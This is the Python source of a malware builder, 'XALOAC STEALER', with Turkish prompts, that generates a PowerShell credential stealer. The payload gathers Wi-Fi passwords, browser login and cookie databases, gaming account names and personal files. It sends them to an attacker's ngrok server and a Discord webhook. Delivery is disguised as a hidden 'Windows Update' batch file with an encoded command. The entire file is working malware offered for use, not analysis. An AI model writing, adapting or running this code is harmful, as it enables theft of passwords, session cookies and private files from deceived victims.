#!/usr/bin/env python3
"""
XALOAC STEALER - BUILDER
python builder.py
"""

import base64
import os
import sys
import requests
import time

def banner():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              XALOAC STEALER - BUILDER                        ║
    ║              Payload Olusturucu                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def get_config():
    print("""
    SUNUCU AYARLARI
    
    Once Kali'de server.py'yi baslat:
        python server.py
    
    Sonra ngrok ile disariya ac:
        ngrok http 8080
    
    Ngrok'un verdigi URL'yi buraya yaz.
    Ornek: https://abc123.ngrok.io
    """)
    
    server_url = input("    Sunucu URL (ngrok): ").strip().rstrip('/')
    
    print("\n    Discord Webhook (ozet bilgi icin - opsiyonel)")
    webhook = input("    Discord Webhook URL (bos birakilabilir): ").strip()
    
    return server_url, webhook

def build_powershell_payload(server_url, discord_webhook):
    """PowerShell payload'unu olustur"""
    
    lines = []
    lines.append('$ErrorActionPreference="SilentlyContinue"')
    lines.append('$ProgressPreference="SilentlyContinue"')
    lines.append('[Console]::Title="Windows Update"')
    lines.append(f'$server="{server_url}"')
    
    if discord_webhook:
        lines.append(f'$discord="{discord_webhook}"')
    else:
        lines.append('$discord=$null')
    
    # Fonksiyonlar
    lines.append(r'''
function SendInfo($data) {
    try {
        $json = $data | ConvertTo-Json -Depth 5 -Compress
        Invoke-RestMethod -Uri "$server/info" -Method Post -Body $json -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop
    } catch {}
}

function SendFile($filepath, $filename) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($filepath)
        Invoke-RestMethod -Uri "$server/upload" -Method Post -Body $bytes -ContentType "application/octet-stream" -Headers @{"X-Filename"=$filename} -TimeoutSec 30 -ErrorAction Stop
    } catch {}
}

function DiscordMsg($m) {
    if ($discord) {
        try {
            if ($m.Length -gt 1900) { $m = $m.Substring(0, 1900) }
            $body = @{content=$m} | ConvertTo-Json
            Invoke-RestMethod -Uri $discord -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
        } catch {}
    }
}
''')
    
    # Sistem bilgisi
    lines.append(r'''
$computer = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$hwid = try { (Get-WmiObject Win32_ComputerSystemProduct).UUID } catch { "N/A" }
$cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "N/A" }
$ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2) } catch { 0 }
$gpu = try { (Get-WmiObject Win32_VideoController)[0].Name } catch { "N/A" }
try { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim() } catch { $ip = "N/A" }
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$info = @{
    computer=$computer; user=$user; ip=$ip; os=$os; hwid=$hwid
    cpu=$cpu; ram=$ram; gpu=$gpu; time=$time
}
SendInfo $info
DiscordMsg "NEW VICTIM: $computer | $user | $ip"
''')
    
    # WiFi
    lines.append(r'''
$wifi = @()
try {
    $profiles = @()
    $raw = netsh wlan show profiles
    foreach ($line in ($raw -split "\n")) {
        if ($line -match ":" -and $line -notmatch "Profil|profil") {
            $name = ($line -split ":",2)[1].Trim()
            if ($name) { $profiles += $name }
        }
    }
    $profiles = $profiles | Select-Object -Unique
    foreach ($p in $profiles) {
        $det = netsh wlan show profile "$p" key=clear
        $pw = $det | Select-String "Anahtar Icerigi|Key Content"
        if ($pw) {
            $pass = ($pw -split ":",2)[1].Trim()
            $wifi += @{ssid=$p; password=$pass}
        }
    }
} catch {}
if ($wifi.Count -gt 0) {
    $wifiInfo = @{type="wifi"; data=$wifi}
    SendInfo $wifiInfo
    DiscordMsg ("WIFI: " + ($wifi | ForEach-Object { "$($_.ssid):$($_.password)" } | Out-String))
}
''')
    
    # Tarayici DB'leri
    lines.append(r'''
$browsers = @(
    @{N="Chrome";P="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"},
    @{N="Edge";P="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"},
    @{N="Brave";P="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"},
    @{N="Opera";P="$env:APPDATA\\Opera Software\\Opera Stable"},
    @{N="Vivaldi";P="$env:LOCALAPPDATA\\Vivaldi\\User Data"}
)

foreach ($b in $browsers) {
    if (-not (Test-Path $b.P)) { continue }
    try {
        $files = @()
        Get-ChildItem $b.P -Recurse -Include "Login Data","Cookies","Web Data","History","Bookmarks","Preferences" -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Length -lt 10MB) { $files += $_.FullName }
        }
        if ($files.Count -gt 0) {
            $zip = "$env:TEMP\\$($b.N).zip"
            Compress-Archive -Path $files -DestinationPath $zip -Force -ErrorAction SilentlyContinue
            SendFile $zip "$($b.N)_data.zip"
            DiscordMsg "BROWSER: $($b.N) DB copied"
        }
    } catch {}
}

$ff = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
if (Test-Path $ff) {
    try {
        $ffFiles = @()
        Get-ChildItem $ff -Recurse -Include "logins.json","cookies.sqlite","places.sqlite","key4.db" -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Length -lt 10MB) { $ffFiles += $_.FullName }
        }
        if ($ffFiles.Count -gt 0) {
            $ffZip = "$env:TEMP\\Firefox.zip"
            Compress-Archive -Path $ffFiles -DestinationPath $ffZip -Force -ErrorAction SilentlyContinue
            SendFile $ffZip "Firefox_data.zip"
            DiscordMsg "BROWSER: Firefox DB copied"
        }
    } catch {}
}
''')
    
    # Oyun hesaplari
    lines.append(r'''
$games = @()

# Steam
foreach ($sp in @("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf","$env:ProgramFiles(x86)\\Steam\\config\\loginusers.vdf")) {
    if (Test-Path $sp) {
        try {
            $c = Get-Content $sp -Raw
            $m = [regex]::Matches($c, '"AccountName"\s+"([^"]+)"')
            if ($m.Count -gt 0) {
                $accs = @(); foreach ($x in $m) { $accs += $x.Groups[1].Value }
                $games += @{platform="Steam"; accounts=$accs}
            }
        } catch {}
        break
    }
}

# Epic
$ep = "$env:LOCALAPPDATA\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
if (Test-Path $ep) {
    try {
        $c = Get-Content $ep -Raw
        $m = [regex]::Matches($c, 'LastLoggedInUser=(.+)')
        if ($m.Count -gt 0) { $games += @{platform="Epic"; accounts=@($m.Groups[1].Value)} }
    } catch {}
}

# Minecraft
foreach ($mp in @("$env:APPDATA\\.minecraft\\launcher_accounts.json","$env:APPDATA\\.minecraft\\launcher_profiles.json")) {
    if (Test-Path $mp) {
        try {
            $d = Get-Content $mp -Raw | ConvertFrom-Json
            $accs = @()
            foreach ($a in $d.accounts.PSObject.Properties) {
                $un = if ($a.Value.username) { $a.Value.username } else { "?" }
                $em = if ($a.Value.email) { $a.Value.email } else { "?" }
                $accs += "$un ($em)"
            }
            if ($accs.Count -gt 0) { $games += @{platform="Minecraft"; accounts=$accs} }
        } catch {}
        break
    }
}

# Riot
$rt = "$env:LOCALAPPDATA\\Riot Games\\Riot Client\\Config"
if (Test-Path $rt) {
    try {
        $accs = @()
        Get-ChildItem $rt -Recurse -Include "*.yml","*.yaml" -ErrorAction SilentlyContinue | ForEach-Object {
            $c = Get-Content $_.FullName -Raw
            $m = [regex]::Matches($c, 'username:\s*(.+)')
            foreach ($x in $m) { $accs += $x.Groups[1].Value.Trim() }
        }
        if ($accs.Count -gt 0) { $games += @{platform="Riot"; accounts=$accs} }
    } catch {}
}

# FiveM
if (Test-Path "$env:LOCALAPPDATA\\FiveM\\FiveM.app") {
    $games += @{platform="FiveM"; accounts=@("Installed")}
}

if ($games.Count -gt 0) {
    $gameInfo = @{type="games"; data=$games}
    SendInfo $gameInfo
    $gameStr = ($games | ForEach-Object { "$($_.platform): $($_.accounts -join ', ')" } | Out-String)
    DiscordMsg ("GAMES:`n" + $gameStr)
}
''')
    
    # Dosyalar
    lines.append(r'''
$dirs = @("$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Pictures","$env:USERPROFILE\\Downloads")
$exts = @("*.jpg","*.jpeg","*.png","*.gif","*.bmp","*.txt","*.pdf","*.doc","*.docx","*.xls","*.xlsx","*.csv","*.json","*.xml","*.cfg","*.conf","*.sql","*.db","*.mp3","*.mp4","*.zip","*.rar","*.py","*.js","*.html","*.php","*.env","*.key","*.pem","*.log","*.dat")
$fileList = @(); $totalSz = 0; $maxSz = 50MB

foreach ($d in $dirs) {
    if (-not (Test-Path $d)) { continue }
    foreach ($e in $exts) {
        if ($totalSz -ge $maxSz) { break }
        try {
            Get-ChildItem $d -Recurse -Filter $e -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB -and $_.Length -gt 0 } | ForEach-Object {
                if ($totalSz -ge $maxSz) { return }
                $script:fileList += $_.FullName
                $script:totalSz += $_.Length
            }
        } catch {}
    }
}

if ($fileList.Count -gt 0) {
    try {
        $fZip = "$env:TEMP\\files.zip"
        Compress-Archive -Path $fileList -DestinationPath $fZip -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue
        SendFile $fZip "stolen_files.zip"
        $szMB = [math]::Round($totalSz/1MB,2)
        DiscordMsg "FILES: $($fileList.Count) files ($szMB MB)"
    } catch {}
}
''')
    
    # Temizlik
    lines.append(r'''
Get-ChildItem $env:TEMP -Filter "*.zip" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
DiscordMsg "DONE: $computer - $ip"
''')
    
    return "\n".join(lines)

def create_delivery_methods(payload_encoded, server_url):
    """Farkli teslimat yontemleri olustur"""
    
    ps_command = f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand {payload_encoded}'
    
    # .bat dosyasi
    bat_content = '@echo off\r\ntitle Windows Update\r\necho Windows Guncellestirmesi...\r\ntimeout /t 3 >nul\r\n' + ps_command + '\r\ntimeout /t 2 >nul\r\necho Tamamlandi!\r\nexit\r\n'
    bat_path = os.path.join(os.path.expanduser("~"), "Desktop", "WindowsUpdate.bat")
    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(bat_content)
    
    # Tek satir PowerShell (direkt calistirma icin)
    short_ps = f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {payload_encoded}'
    
    # Base64 payload dosyasi
    ps1_path = os.path.join(os.path.expanduser("~"), "Desktop", "payload.ps1")
    ps_script = "\n".join(build_powershell_payload(server_url, "").split("\n")[:-1])
    with open(ps1_path, "w", encoding="utf-8") as f:
        f.write(ps_script)
    
    return bat_path, short_ps, ps1_path

def main():
    banner()
    
    print("""
    ONCE KALI'DE:
    1. python server.py
    2. ngrok http 8080
    3. Ngrok URL'sini kopyala
    
    SONRA BURAYA URL'YI GIR
    """)
    
    server_url, discord = get_config()
    
    if not server_url:
        print("\n    [!] Sunucu URL'si gerekli!")
        return
    
    # Sunucunun calistigini kontrol et
    print(f"\n    [*] Sunucu kontrol ediliyor: {server_url}/ping")
    try:
        r = requests.get(f"{server_url}/ping", timeout=5)
        if r.text == "OK":
            print(f"    [+] Sunucu aktif!")
        else:
            print(f"    [-] Sunucu yanit vermedi!")
    except:
        print(f"    [-] Sunucuya baglanilamadi! Once server.py'yi baslat.")
        return
    
    print("\n    [*] Payload olusturuluyor...")
    ps_script = build_powershell_payload(server_url, discord)
    encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
    
    print("    [*] Teslimat dosyalari olusturuluyor...")
    bat_path, short_ps, ps1_path = create_delivery_methods(encoded, server_url)
    
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                        HAZIR!                               ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                                                            ║
    ║  .bat DOSYASI: {bat_path}
    ║  .ps1 DOSYASI: {ps1_path}
    ║                                                            ║
    ║  KISA KOMUT (direkt calistirma):                          ║
    ║  {short_ps[:80]}...                                        ║
    ║                                                            ║
    ║  VERILER SU ADRESE GELECEK:                               ║
    ║  {server_url}/victims                                      ║
    ║                                                            ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    main()